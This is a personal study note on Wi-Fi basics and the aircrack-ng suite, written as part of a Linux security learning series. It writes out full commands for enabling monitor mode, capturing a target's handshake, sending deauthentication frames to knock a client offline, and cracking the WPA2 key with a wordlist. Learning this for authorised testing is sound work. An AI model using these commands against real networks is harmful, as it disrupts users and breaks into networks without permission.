# 🦈 Day 29 : Understanding and Inspecting Wireless Networks (Part 01)

Welcome to Day 06 of Week 04 of my Linux Security learning journey. This document covers the fundamental mechanics of Wi-Fi (IEEE 802.11) technologies, security protocols, wireless operational modes, interface commands, and step-by-step reconnaissance and cryptographic cracking workflows using the **Aircrack-ng** suite.

---

## 🎯 Key Points & Core Concepts

### 1. ⚙️ Introduction & Context

* **Core Significance:** The ability to scan, analyze, and connect to wireless network devices is a fundamental skill for penetration testers and security analysts. Wi-Fi (IEEE 802.11) and Bluetooth serve as standard media for modern wireless communications.
* **Security & Threat Risks:** Gaining unauthorized access to a wireless Access Point (AP) grants entry into the internal network segment, exposing all connected hosts to packet sniffing, credential harvesting, and Man-in-the-Middle (MitM) attacks.
* **Operating System Integration:** Kali Linux comes equipped with native network stacks, specialized wireless kernel drivers, and the complete `aircrack-ng` suite pre-installed.

---

### 2. 🏛️ Fundamental Wi-Fi Terminology & Technologies

#### Network Identifiers

* **AP (Access Point):** Central networking device providing wireless connectivity to client devices.
* **SSID (Service Set Identifier):** Human-readable name assigned to a single wireless network.
* **ESSID (Extended Service Set ID):** Collective network name used across multiple APs spanning a wider local area network (LAN).
* **BSSID (Basic Service Set ID):** Unique hardware MAC address identifying a specific Access Point radio interface.

#### Physical Layer Specifications

* **Channels:** Operates on 14 channels globally (1–14), legally restricted to channels 1–11 in North America.
* **Signal Power (PWR):** Proximity to an AP yields higher signal-to-noise ratios, leading to lower packet corruption during raw frame captures.
* **Operational Range:** Standard regulatory power limit is 0.5 Watts (~300 feet / 100 meters), which can be extended up to 20 miles using directional high-gain antennas.
* **Frequency Bands:** Primary operational frequencies are 2.4 GHz (longer range, higher obstacle penetration) and 5 GHz (higher throughput, lower range).

#### Security Protocols & Operational Modes

* **WEP (Wired Equivalent Privacy):** Legacy protocol; vulnerable to statistical key recovery (cracked in minutes).
* **WPA (Wi-Fi Protected Access):** Transitional standard created to address WEP vulnerabilities using TKIP.
* **WPA2-PSK (Pre-Shared Key):** Standard modern protocol relying on CCMP/AES encryption and a 4-Way Handshake authentication flow.
* **Operational Modes:**
* **Managed Mode:** Default client behavior (associates and communicates directly with an AP).
* **Master Mode:** Converts the wireless adapter to function as an Access Point itself.
* **Monitor Mode:** Places the adapter in promiscuous RF mode to sniff and capture raw 802.11 frames from all surrounding networks.



---

### 3. 🔑 Basic Linux Wireless Commands

#### Interface Inspection & Configuration

* **`ifconfig`:** Lists active network interfaces (`wlan0`, `wlan1`) and assigned IP configurations.
* **`iwconfig`:** Displays operational parameters specific to wireless adapters (Mode, ESSID, BSSID, Tx-Power, Link Quality).

#### AP Scanning & Connection Management

* **`iwlist` Scanning:**
```bash
kali > iwlist wlan0 scan

```


* **NetworkManager CLI (`nmcli`) Survey & Association:**
```bash
kali > nmcli dev wifi
kali > nmcli dev wifi connect Hackers-Arise password 12345678

```



---

### 4. 🛠️ Wi-Fi Reconnaissance & Cracking Workflow (`aircrack-ng` Suite)

#### Core Requirements

1. Target AP's MAC Address (BSSID)
2. Target AP's Operating Channel Number
3. Connected Client's MAC Address (Station)
4. Wordlist / Dictionary File

#### Step-by-Step Execution Sequence

1. **1. Interface Transition:** Enable Monitor Mode.
Transition interface from Managed to Monitor mode using `airmon-ng start wlan0` (creates `wlan0mon`). Kill conflicting daemons using `airmon-ng check kill`.


2. **2. Target Identification:** Ambient Network Survey.
Execute `airodump-ng wlan0mon` to scan surrounding access points and identify target BSSID, Channel, and associated Station MAC addresses.


3. **3. Handshake Capture:** Targeted Capture & Deauth.
Lock capture to target channel/BSSID in Terminal 1, while executing a targeted deauthentication attack in Terminal 2 using `aireplay-ng`.


4. **4. Cryptographic Cracking:** Offline Dictionary Attack.
Crack the captured 4-Way Handshake file offline using `aircrack-ng` and a wordlist without transmitting frames over the wire.


#### 3-Terminal Attack Execution Setup

```
+------------------------+     Raw RF Frames     +---------------------------------+
|   Kali Linux Machine   | --------------------> |    Target Access Point (AP)     |
|  (Attacker / wlan0mon) |                       |    BSSID: 01:01:AA:BB:CC:22     |
+------------------------+                       +---------------------------------+
            |                                                     |
            | Deauth Frame                                        | 4-Way Handshake
            v                                                     v
+------------------------+                       +---------------------------------+
|   Associated Client    | <-------------------> |     WPA2 4-Way Handshake      |
| MAC: A0:A3:E2:44:7C:E5 |  Re-association Flow  | (Captured in Hackers-Arise.cap) |
+------------------------+                       +---------------------------------+

```

#### 🟢 Terminal 1: Focused Packet Capture

```bash
kali > airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon

```

#### 🟡 Terminal 2: Client Deauthentication Attack

```bash
kali > aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon

```

#### 🔴 Terminal 3: Offline Cryptographic Cracking

```bash
kali > aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK-01.cap

```

---

### 5. 🗺️ Conceptual Comparison (Wireless Security Protocols)

| Feature / Metric | WEP 🔓 | WPA (TKIP) ⚠️ | WPA2-PSK (AES/CCMP) 🛡️ |
| --- | --- | --- | --- |
| **Encryption Algorithm** | RC4 (Stream Cipher) | RC4 with TKIP wrapper | AES-CCMP (Block Cipher) |
| **Key Exchange** | Static Key | Per-packet Key Mixing | 4-Way Handshake |
| **Security Status** | Deprecated / Broken | Vulnerable / Legacy | Standard Modern Protocol |
| **Crack Method** | Statistical IV Accumulation | Dictionary / Handshake | Dictionary / PMKID Capture |
| **Crack Speed** | Minutes (100% success) | Hours to Days (Wordlist) | Hours to Days (Wordlist) |

---

### 🛠️ Utilities & Command Reference

| Utility / Command | Syntax Example | Primary Purpose / Description |
| --- | --- | --- |
| **`ifconfig`** | `ifconfig wlan0` | Displays activated network interfaces and assigned IP configurations. |
| **`iwconfig`** | `iwconfig wlan0` | Displays wireless adapter operational parameters (Mode, ESSID, Tx-Power). |
| **`iwlist`** | `iwlist wlan0 scan` | Performs detailed wireless survey listing cells, channels, and encryption. |
| **`nmcli`** | `nmcli dev wifi connect <SSID> password <pass>` | NetworkManager CLI utility to scan and connect to wireless networks. |
| **`airmon-ng`** | `airmon-ng start wlan0` | Enables monitor mode on adapter and manages conflicting services. |
| **`airodump-ng`** | `airodump-ng -c 10 --bssid <MAC> -w <file> wlan0mon` | Captures raw 802.11 frames and writes 4-Way Handshakes to disk. |
| **`aireplay-ng`** | `aireplay-ng --deauth 100 -a <AP> -c <Client> wlan0mon` | Generates wireless traffic and sends deauthentication frames to clients. |
| **`aircrack-ng`** | `aircrack-ng -w <wordlist> -b <AP_MAC> <capture.cap>` | Performs offline dictionary attack against captured 4-Way Handshakes. |

---

### 🔑 Key Takeaways for Revision

* **Monitor Mode Function:** Places the wireless network adapter into promiscuous RF mode to capture raw 802.11 frames across surrounding channels.
* **Deauthentication Vulnerability:** Management frames in 802.11a/b/g/n are unencrypted by default, allowing attackers to spoof deauth packets and force client reconnects.
* **4-Way Handshake Capture:** The goal of deauthenticating a client is to force a re-association flow, capturing the transmitted WPA2 4-Way Handshake.
* **Offline Cracking Formula:**

$$\text{Reconnaissance } (\texttt{airodump-ng}) \longrightarrow \text{Deauth } (\texttt{aireplay-ng}) \longrightarrow \text{Capture } (\text{.cap}) \longrightarrow \text{Crack } (\texttt{aircrack-ng})$$

---
